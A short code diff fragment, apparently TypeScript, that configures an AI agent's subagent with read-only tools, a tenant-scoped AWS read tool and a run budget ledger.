+            subagentTools: [...filterReadOnlyTools(baseTools as never[]), createAwsReadTool(tenantId!)],
             ledger: createRunBudgetLedger(subagentBudget),
             budget: subagentBudget,
             onSubagentEvent: config.onSubagentEvent,
